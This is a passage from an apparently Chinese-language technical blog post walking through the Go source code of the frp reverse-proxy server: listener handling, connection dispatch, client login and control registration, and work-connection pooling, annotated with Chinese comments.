class="hljs-comment">// 处理各种类型的监听器</span><br><br><span class="hljs-keyword">go</span> svr.HandleListener(svr.sshTunnelListener, <span class="hljs-literal">true</span>)<br><br><span class="hljs-keyword">if</span> svr.kcpListener != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> svr.HandleListener(svr.kcpListener, <span class="hljs-literal">false</span>)<br>&#125;<br><span class="hljs-keyword">if</span> svr.quicListener != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> svr.HandleQUICListener(svr.quicListener)<br>&#125;<br><span class="hljs-keyword">go</span> svr.HandleListener(svr.websocketListener, <span class="hljs-literal">false</span>)<br><span class="hljs-keyword">go</span> svr.HandleListener(svr.tlsListener, <span class="hljs-literal">false</span>)<br><br><span class="hljs-keyword">if</span> svr.rc.NatHoleController != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> svr.rc.NatHoleController.CleanWorker(svr.ctx)<br>&#125;<br><br><span class="hljs-keyword">if</span> svr.sshTunnelGateway != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> svr.sshTunnelGateway.Run()<br>&#125;<br><span class="hljs-comment">// 处理监听器</span><br>svr.HandleListener(svr.listener, <span class="hljs-literal">false</span>)<br><br>&lt;-svr.ctx.Done()<br><span class="hljs-comment">// service context may not be canceled by svr.Close(), we should call it here to release resources</span><br><span class="hljs-keyword">if</span> svr.listener != <span class="hljs-literal">nil</span> &#123;<br>svr.Close()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="处理监听-HandleListener"><a href="#处理监听-HandleListener" class="headerlink" title="处理监听 HandleListener"></a>处理监听 HandleListener</h3><p><code>HandleListener</code>​ 主要是去接收客户端的连接，然后启一个协程去使用 <code>svr.handleConnection</code>​ 去处理这个连接。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// HandleListener accepts connections from client and call handleConnection to handle them.</span><br><span class="hljs-comment">// If internal is true, it means that this listener is used for internal communication like ssh tunnel gateway.</span><br><span class="hljs-comment">// TODO(fatedier): Pass some parameters of listener/connection through context to avoid passing too many parameters.</span><br><span class="hljs-comment">// HandleListener接收来自客户端的连接并调用handlecontion来处理它们。</span><br><span class="hljs-comment">// 如果internal为true，则表示该侦听器用于内部通信，如ssh隧道网关。</span><br><span class="hljs-comment">// TODO(fatedier)：通过上下文传递监听器/连接的一些参数，以避免传递太多参数。</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> HandleListener(l net.Listener, internal <span class="hljs-type">bool</span>) &#123;<br><span class="hljs-comment">// Listen for incoming connections from client.</span><br><span class="hljs-keyword">for</span> &#123;<br><span class="hljs-comment">// 接收客户端的连接</span><br>c, err := l.Accept()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Warnf(<span class="hljs-string">&quot;Listener for incoming connections from client closed&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// inject xlog object into net.Conn context</span><br>xl := xlog.New()<br>ctx := context.Background()<br><br>c = netpkg.NewContextConn(xlog.NewContext(ctx, xl), c)<br><br><span class="hljs-keyword">if</span> !internal &#123;<br>log.Tracef(<span class="hljs-string">&quot;start check TLS connection...&quot;</span>)<br>originConn := c<br>forceTLS := svr.cfg.Transport.TLS.Force<br><span class="hljs-keyword">var</span> isTLS, custom <span class="hljs-type">bool</span><br>c, isTLS, custom, err = netpkg.CheckAndEnableTLSServerConnWithTimeout(c, svr.tlsConfig, forceTLS, connReadTimeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Warnf(<span class="hljs-string">&quot;CheckAndEnableTLSServerConnWithTimeout error: %v&quot;</span>, err)<br>originConn.Close()<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Tracef(<span class="hljs-string">&quot;check TLS connection success, isTLS: %v custom: %v internal: %v&quot;</span>, isTLS, custom, internal)<br>&#125;<br><br><span class="hljs-comment">// Start a new goroutine to handle connection.</span><br><span class="hljs-comment">// 新开一个协程处理连接</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, frpConn net.Conn)</span></span> &#123;<br><span class="hljs-comment">// 多路复用处理</span><br><span class="hljs-keyword">if</span> lo.FromPtr(svr.cfg.Transport.TCPMux) &amp;&amp; !internal &#123;<br>fmuxCfg := fmux.DefaultConfig()<br>fmuxCfg.KeepAliveInterval = time.Duration(svr.cfg.Transport.TCPMuxKeepaliveInterval) * time.Second<br>fmuxCfg.LogOutput = io.Discard<br>fmuxCfg.MaxStreamWindowSize = <span class="hljs-number">6</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span><br>session, err := fmux.Server(frpConn, fmuxCfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Warnf(<span class="hljs-string">&quot;Failed to create mux connection: %v&quot;</span>, err)<br>frpConn.Close()<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-keyword">for</span> &#123;<br>stream, err := session.AcceptStream()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Debugf(<span class="hljs-string">&quot;Accept new mux stream error: %v&quot;</span>, err)<br>session.Close()<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">go</span> svr.handleConnection(ctx, stream, internal)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// 正常的客户端连接处理</span><br>svr.handleConnection(ctx, frpConn, internal)<br>&#125;<br>&#125;(ctx, c)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="处理连接-handleConnection"><a href="#处理连接-handleConnection" class="headerlink" title="处理连接 handleConnection"></a>处理连接 handleConnection</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> handleConnection(ctx context.Context, conn net.Conn, internal <span class="hljs-type">bool</span>) &#123;<br>xl := xlog.FromContextSafe(ctx)<br><br><span class="hljs-keyword">var</span> (<br>rawMsg msg.Message<br>err    <span class="hljs-type">error</span><br>)<br><span class="hljs-comment">// 读取连接</span><br>_ = conn.SetReadDeadline(time.Now().Add(connReadTimeout))<br><span class="hljs-keyword">if</span> rawMsg, err = msg.ReadMsg(conn); err != <span class="hljs-literal">nil</span> &#123;<br>log.Tracef(<span class="hljs-string">&quot;Failed to read message: %v&quot;</span>, err)<br>conn.Close()<br><span class="hljs-keyword">return</span><br>&#125;<br>_ = conn.SetReadDeadline(time.Time&#123;&#125;)<br><br><span class="hljs-keyword">switch</span> m := rawMsg.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-comment">// 登录消息</span><br><span class="hljs-keyword">case</span> *msg.Login:<br><span class="hljs-comment">// server plugin hook</span><br><span class="hljs-comment">// 插件登录 应该就 HTTP 的插件</span><br>content := &amp;plugin.LoginContent&#123;<br>Login:         *m,<br>ClientAddress: conn.RemoteAddr().String(),<br>&#125;<br>retContent, err := svr.pluginManager.Login(content)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br>m = &amp;retContent.Login<br><span class="hljs-comment">// 具体的处理 注册</span><br>err = svr.RegisterControl(conn, m, internal)<br>&#125;<br><br><span class="hljs-comment">// If login failed, send error message there.</span><br><span class="hljs-comment">// Otherwise send success message in control&#x27;s work goroutine.</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;register control error: %v&quot;</span>, err)<br>_ = msg.WriteMsg(conn, &amp;msg.LoginResp&#123;<br>Version: version.Full(),<br>Error:   util.GenerateResponseErrorString(<span class="hljs-string">&quot;register control error&quot;</span>, err, lo.FromPtr(svr.cfg.DetailedErrorsToClient)),<br>&#125;)<br>conn.Close()<br>&#125;<br><span class="hljs-comment">// 新建工作消息</span><br><span class="hljs-keyword">case</span> *msg.NewWorkConn:<br><span class="hljs-keyword">if</span> err := svr.RegisterWorkConn(conn, m); err != <span class="hljs-literal">nil</span> &#123;<br>conn.Close()<br>&#125;<br><span class="hljs-keyword">case</span> *msg.NewVisitorConn:<br><span class="hljs-comment">// .....</span><br><span class="hljs-keyword">default</span>:<br>log.Warnf(<span class="hljs-string">&quot;Error message type for the new connection [%s]&quot;</span>, conn.RemoteAddr().String())<br>conn.Close()<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="msg-Login"><a href="#msg-Login" class="headerlink" title="msg.Login"></a>msg.Login</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// server plugin hook</span><br><span class="hljs-comment">// 插件登录</span><br>content := &amp;plugin.LoginContent&#123;<br>Login:         *m,<br>ClientAddress: conn.RemoteAddr().String(),<br>&#125;<br>retContent, err := svr.pluginManager.Login(content)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br>m = &amp;retContent.Login<br><span class="hljs-comment">// 插件没啥问题就注册控制器 插件主要是 HTTP 其他不管</span><br>err = svr.RegisterControl(conn, m, internal)<br>&#125;<br><br><span class="hljs-comment">// If login failed, send error message there.</span><br><span class="hljs-comment">// Otherwise send success message in control&#x27;s work goroutine.</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;register control error: %v&quot;</span>, err)<br>_ = msg.WriteMsg(conn, &amp;msg.LoginResp&#123;<br>Version: version.Full(),<br>Error:   util.GenerateResponseErrorString(<span class="hljs-string">&quot;register control error&quot;</span>, err, lo.FromPtr(svr.cfg.DetailedErrorsToClient)),<br>&#125;)<br>conn.Close()<br>&#125;<br></code></pre></td></tr></table></figure><p><code>svr.RegisterControl(conn, m, internal)</code>​</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> RegisterControl(ctlConn net.Conn, loginMsg *msg.Login, internal <span class="hljs-type">bool</span>) <span class="hljs-type">error</span> &#123;<br><span class="hljs-comment">// If client&#x27;s RunID is empty, it&#x27;s a new client, we just create a new controller.</span><br><span class="hljs-comment">// Otherwise, we check if there is one controller has the same run id. If so, we release previous controller and start new one.</span><br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br><span class="hljs-comment">// 如果 RunID 为空就新创建一个</span><br><span class="hljs-keyword">if</span> loginMsg.RunID == <span class="hljs-string">&quot;&quot;</span> &#123;<br>loginMsg.RunID, err = util.RandID()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br>&#125;<br><br>ctx := netpkg.NewContextFromConn(ctlConn)<br>xl := xlog.FromContextSafe(ctx)<br>xl.AppendPrefix(loginMsg.RunID)<br>ctx = xlog.NewContext(ctx, xl)<br>xl.Infof(<span class="hljs-string">&quot;client login info: ip [%s] version [%s] hostname [%s] os [%s] arch [%s]&quot;</span>,<br>ctlConn.RemoteAddr().String(), loginMsg.Version, loginMsg.Hostname, loginMsg.Os, loginMsg.Arch)<br><br><span class="hljs-comment">// 认证检查</span><br>authVerifier := svr.authVerifier<br><span class="hljs-keyword">if</span> internal &amp;&amp; loginMsg.ClientSpec.AlwaysAuthPass &#123;<br>authVerifier = auth.AlwaysPassVerifier<br>&#125;<br><span class="hljs-comment">// 根据客户端的时间戳 + 服务端 Token 生成一个私钥, 检查下私钥对不对</span><br><span class="hljs-keyword">if</span> err := authVerifier.VerifyLogin(loginMsg); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-comment">// TODO(fatedier): use SessionContext</span><br><span class="hljs-comment">// 新建一个控制器 初始化消息调度 ... 和客户端其实差不多</span><br>ctl, err := NewControl(ctx, svr.rc, svr.pxyManager, svr.pluginManager, authVerifier, ctlConn, !internal, loginMsg, svr.cfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>xl.Warnf(<span class="hljs-string">&quot;create new controller error: %v&quot;</span>, err)<br><span class="hljs-comment">// don&#x27;t return detailed errors to client</span><br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;unexpected error when creating new controller&quot;</span>)<br>&#125;<br><span class="hljs-comment">// 添加到控制器管理, 如果有之前的相同 ID 的就释放掉之前的</span><br><span class="hljs-keyword">if</span> oldCtl := svr.ctlManager.Add(loginMsg.RunID, ctl); oldCtl != <span class="hljs-literal">nil</span> &#123;<br>oldCtl.WaitClosed()<br>&#125;<br><span class="hljs-comment">// 启动控制器</span><br>ctl.Start()<br><br><span class="hljs-comment">// for statistics</span><br>metrics.Server.NewClient()<br><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// block until control closed</span><br>ctl.WaitClosed()<br>svr.ctlManager.Del(loginMsg.RunID, ctl)<br>&#125;()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>控制器：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewControl</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">ctx context.Context,</span></span><br><span class="hljs-params"><span class="hljs-function">rc *controller.ResourceController,</span></span><br><span class="hljs-params"><span class="hljs-function">pxyManager *proxy.Manager,</span></span><br><span class="hljs-params"><span class="hljs-function">pluginManager *plugin.Manager,</span></span><br><span class="hljs-params"><span class="hljs-function">authVerifier auth.Verifier,</span></span><br><span class="hljs-params"><span class="hljs-function">ctlConn net.Conn,</span></span><br><span class="hljs-params"><span class="hljs-function">ctlConnEncrypted <span class="hljs-type">bool</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">loginMsg *msg.Login,</span></span><br><span class="hljs-params"><span class="hljs-function">serverCfg *v1.ServerConfig,</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span> (*Control, <span class="hljs-type">error</span>) &#123;<br>poolCount := loginMsg.PoolCount<br><span class="hljs-keyword">if</span> poolCount &gt; <span class="hljs-type">int</span>(serverCfg.Transport.MaxPoolCount) &#123;<br>poolCount = <span class="hljs-type">int</span>(serverCfg.Transport.MaxPoolCount)<br>&#125;<br>ctl := &amp;Control&#123;<br>rc:            rc,<br>pxyManager:    pxyManager,<br>pluginManager: pluginManager,<br>authVerifier:  authVerifier,<br>conn:          ctlConn,<br>loginMsg:      loginMsg,<br>workConnCh:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> net.Conn, poolCount+<span class="hljs-number">10</span>),<br>proxies:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]proxy.Proxy),<br>poolCount:     poolCount,<br>portsUsedNum:  <span class="hljs-number">0</span>,<br>runID:         loginMsg.RunID,<br>serverCfg:     serverCfg,<br>xl:            xlog.FromContextSafe(ctx),<br>ctx:           ctx,<br>doneCh:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;),<br>&#125;<br>ctl.lastPing.Store(time.Now())<br><span class="hljs-comment">// 加密连接 消息调度器</span><br><span class="hljs-keyword">if</span> ctlConnEncrypted &#123;<br>cryptoRW, err := netpkg.NewCryptoReadWriter(ctl.conn, []<span class="hljs-type">byte</span>(ctl.serverCfg.Auth.Token))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>ctl.msgDispatcher = msg.NewDispatcher(cryptoRW)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ctl.msgDispatcher = msg.NewDispatcher(ctl.conn)<br>&#125;<br><span class="hljs-comment">// 消息处理程序</span><br>ctl.registerMsgHandlers()<br>ctl.msgTransporter = transport.NewMessageTransporter(ctl.msgDispatcher.SendChannel())<br><span class="hljs-keyword">return</span> ctl, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>启动控制器：</p><ol><li>响应客户端登录成功</li><li>向客户端发送 msg.ReqWorkConn 消息</li><li>启动心跳、消息调度</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Start send a login success message to client and start working.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> Start() &#123;<br><span class="hljs-comment">// 返回登录成功消息</span><br>loginRespMsg := &amp;msg.LoginResp&#123;<br>Version: version.Full(),<br>RunID:   ctl.runID,<br>Error:   <span class="hljs-string">&quot;&quot;</span>,<br>&#125;<br>_ = msg.WriteMsg(ctl.conn, loginRespMsg)<br><span class="hljs-comment">// 发送请求工作连接 =&gt; 让客户端返回新建工作连接放到连接池中</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 连接池</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; ctl.poolCount; i++ &#123;<br><span class="hljs-comment">// ignore error here, that means that this control is closed</span><br>_ = ctl.msgDispatcher.Send(&amp;msg.ReqWorkConn&#123;&#125;)<br>&#125;<br>&#125;()<br><span class="hljs-comment">// 启动消息调度器等</span><br><span class="hljs-keyword">go</span> ctl.worker()<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctl *Control)</span></span> worker() &#123;<br>xl := ctl.xl<br><span class="hljs-comment">// 心跳</span><br><span class="hljs-keyword">go</span> ctl.heartbeatWorker()<br><span class="hljs-comment">// 消息调度器</span><br><span class="hljs-keyword">go</span> ctl.msgDispatcher.Run()<br><span class="hljs-comment">// 关闭操作 移除管理器、关闭监听等</span><br>&lt;-ctl.msgDispatcher.Done()<br>ctl.conn.Close()<br><br>ctl.mu.Lock()<br><span class="hljs-keyword">defer</span> ctl.mu.Unlock()<br><br><span class="hljs-built_in">close</span>(ctl.workConnCh)<br><span class="hljs-keyword">for</span> workConn := <span class="hljs-keyword">range</span> ctl.workConnCh &#123;<br>workConn.Close()<br>&#125;<br><br><span class="hljs-keyword">for</span> _, pxy := <span class="hljs-keyword">range</span> ctl.proxies &#123;<br>pxy.Close()<br>ctl.pxyManager.Del(pxy.GetName())<br>metrics.Server.CloseProxy(pxy.GetName(), pxy.GetConfigurer().GetBaseConfig().Type)<br><br>notifyContent := &amp;plugin.CloseProxyContent&#123;<br>User: plugin.UserInfo&#123;<br>User:  ctl.loginMsg.User,<br>Metas: ctl.loginMsg.Metas,<br>RunID: ctl.loginMsg.RunID,<br>&#125;,<br>CloseProxy: msg.CloseProxy&#123;<br>ProxyName: pxy.GetName(),<br>&#125;,<br>&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>_ = ctl.pluginManager.CloseProxy(notifyContent)<br>&#125;()<br>&#125;<br><br>metrics.Server.CloseClient()<br>xl.Infof(<span class="hljs-string">&quot;client exit success&quot;</span>)<br><span class="hljs-built_in">close</span>(ctl.doneCh)<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="msg-NewWorkConn"><a href="#msg-NewWorkConn" class="headerlink" title="msg.NewWorkConn"></a>msg.NewWorkConn</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> *msg.NewWorkConn:<br><span class="hljs-comment">// 注册工作连接</span><br><span class="hljs-keyword">if</span> err := svr.RegisterWorkConn(conn, m); err != <span class="hljs-literal">nil</span> &#123;<br>conn.Close()<br>&#125;<br><br><br><span class="hljs-comment">// RegisterWorkConn register a new work connection to control and proxies need it.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(svr *Service)</span></span> RegisterWorkConn(workConn net.Conn, newMsg *msg.NewWorkConn) <span class="hljs-type">error</span> &#123;<br>xl := netpkg.NewLogFromConn(workConn)<br><span class="hljs-comment">// 获取这个代理的控制器</span><br>ctl, exist := svr.ctlManager.GetByID(newMsg.RunID)<br><span class="hljs-keyword">if</span> !exist &#123;<br>xl.Warnf(<span class="hljs-string">&quot;No client control found for run id [%s]&quot;</span>, newMsg.RunID)<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;no client control found for run id [%s]&quot;</span>, newMsg.RunID)<br>&#125;<br><span class="hljs-comment">// server plugin hook</span><br>content := &amp;plugin.NewWorkConnContent&#123;<br>User: plugin.UserInfo&#123;<br>User:  ctl.loginMsg.User,<br>Metas: ctl.loginMsg.Metas,<br>RunID: ctl.loginMsg.RunID,<br>&#125;,<br>NewWorkConn: *newMsg,<br>&#125;<br>retContent, err := svr.pluginManager.NewWorkConn(content)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br>newMsg = &amp;retContent.NewWorkConn<br><span 